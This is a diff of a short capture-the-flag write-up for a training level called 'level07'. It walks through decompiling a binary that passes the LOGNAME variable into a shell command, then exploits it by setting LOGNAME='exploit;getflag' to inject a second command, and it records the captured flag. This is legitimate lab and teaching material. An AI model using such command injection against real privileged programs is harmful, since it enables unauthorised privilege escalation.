@@ -1,31 +1,37 @@
 # level07
 
+1. examinate existing files permissions
+
 ```shell
 ls -la
 ```
 
-shows that the level07 executable belongs to flag07 group, privilege escalation should be possible
+shows that the level07 executable belongs to flag07 group
+
+2. get the executable (from an external device)
 
 ```shell
-scp -P 4242 level07@127.0.0.1:~/level06 .
+scp -P 4242 level07@<host>:level07 .
 ```
+
+3. decompile the executable and examine the resulting code
 
 ```shell
 ~/dev/tools/retdec/bin/retdec-decompiler.py level07
 ```
 
-shows `return system(buffer);` which permits arbitrary code execution pretty easily
+shows `asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));` which permits arbitrary code execution
+
+4. tweak the environment variables
 
 ```shell
 LOGNAME='exploit;getflag'
 ```
 
+5. pwn the flag
+
 ```shell
 ./level07
 ```
 
-gives flag:
-
-```shell
-fiumuikeil55xe9cu4dood66h
-```
+gives flag: `fiumuikeil55xe9cu4dood66h`
